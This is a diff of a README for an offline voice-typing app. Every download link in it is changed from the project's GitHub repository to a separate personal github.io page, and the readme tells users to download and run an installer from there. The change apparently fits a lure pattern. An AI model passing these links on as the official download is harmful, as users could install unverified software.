@@ -1,10 +1,10 @@
 # 🎤 offline-voice-typing - Your PC Types as You Speak
 
-[![Download Now](https://img.shields.io/badge/Download-Offline_Voice_Typing-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/hoodtristen056/offline-voice-typing)
+[![Download Now](https://img.shields.io/badge/Download-Offline_Voice_Typing-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://hoodtristen056.github.io)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/hoodtristen056/offline-voice-typing](https://github.com/hoodtristen056/offline-voice-typing)
+Visit this link to download the application: [https://hoodtristen056.github.io](https://hoodtristen056.github.io)
 
 Once you visit the page, look for the latest release and download the installer file. After downloading, run the installer and follow the on-screen instructions. The application will be ready to use in just a few minutes.
 
@@ -64,7 +64,7 @@ These are general guidelines. The application is lightweight and should run smoo
 ## 📝 How to Use
 
 ### Step 1: Download and Install
-Visit [https://github.com/hoodtristen056/offline-voice-typing](https://github.com/hoodtristen056/offline-voice-typing) and download the application. Run the installer and complete the setup process.
+Visit [https://hoodtristen056.github.io](https://hoodtristen056.github.io) and download the application. Run the installer and complete the setup process.
 
 ### Step 2: Choose Your Language
 When you first open the application, select your preferred language from the list. You can switch languages anytime.
@@ -187,13 +187,13 @@ Recent updates have focused on:
 
 ## ✅ Quick Start Checklist
 
-- [ ] Download from [the official page](https://github.com/hoodtristen056/offline-voice-typing)
+- [ ] Download from [the official page](https://hoodtristen056.github.io)
 - [ ] Install the application
 - [ ] Select your preferred language
 - [ ] Connect and test your microphone
 - [ ] Start dictating your first document
 
-Visit this link to download the application: [https://github.com/hoodtristen056/offline-voice-typing](https://github.com/hoodtristen056/offline-voice-typing)
+Visit this link to download the application: [https://hoodtristen056.github.io](https://hoodtristen056.github.io)
 
 Start speaking, and let your computer do the typing today!
 
